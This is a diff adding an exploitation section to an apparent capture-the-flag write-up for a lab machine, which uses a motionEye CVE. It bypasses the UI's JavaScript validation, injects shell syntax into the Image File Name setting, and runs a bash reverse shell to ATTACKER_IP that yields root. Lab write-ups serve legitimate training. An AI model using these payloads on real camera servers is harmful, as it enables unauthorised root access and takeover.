@@ -330,4 +330,72 @@ mark@cctv:~$
 ```
 We can now view the website via any web browser using `http://127.0.0.1:8765/` and login using the credentials found in the `.conf` file.
 
+Logged into the machine we can see the version of motionEye running and find the corresponding CVE [CVE-2025-60787](https://www.exploit-db.com/exploits/52481). 
 
+Client-side validation in motionEye's web UI can be bypassed via overriding the JS validation function. Arbitrary values (including shell interpolation syntax) can be saved into the motion config. When motion is restarted, the motion process interprets the config and can execute shell syntax embedded inside configuration values such as `image_file_name`.
+
+We can bypass the JS validation function via the console in the web browser
+
+```
+configUiValid = function() { return true; };
+```
+
+This forces the UI validation function to always return true and allows any value to be accepted by the UI forms.
+
+We can then attempt a RCE shell via the Settings -> Still Images -> Image File Name and clicking apply.
+
+```
+$(echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/rce.sh).%Y-%m-%d-%H-%M-%S
+```
+
+Before attempting to execute the `rce.sh` file via motionEye's exploit we need to "restart" the config file or reset motionEye so the changes apply on the backend of the machine. This can be done a multiltude of ways but easiest is by simply clicking the "Snapshot" button.
+
+We can then setup a listener on our attacker machine and execute the `rce.sh` file via bash on motionEye's interface.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+Now putting the execution command in the Image name -> Apply -> Snapshot
+
+```
+$(bash /tmp/rce.sh).%Y-%m-%d-%H-%M-%S
+```
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [ATTACKER_IP] from (UNKNOWN) [10.129.244.156] 51420
+bash: cannot set terminal process group (3171): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cctv:/etc/motioneye#
+```
+
+Success. We can now enumerate both flags on the machine.
+
+```
+root@cctv:/etc/motioneye# ls
+camera-1.conf
+motion.conf
+motioneye.conf
+root@cctv:/etc/motioneye# cd /root
+root@cctv:~# ls
+clean_logs.sh
+docker-binaries
+files
+root.txt
+snap
+root@cctv:~# cat root.txt
+ROOT_FLAG_HERE
+root@cctv:~# cd /home/sa_mark
+root@cctv:/home/sa_mark# ls
+SecureVision Staff Announcement.pdf
+user.txt
+root@cctv:/home/sa_mark# cat user.txt
+cat user.txt
+USER_FLAG_HERE
+root@cctv:/home/sa_mark# 
+```
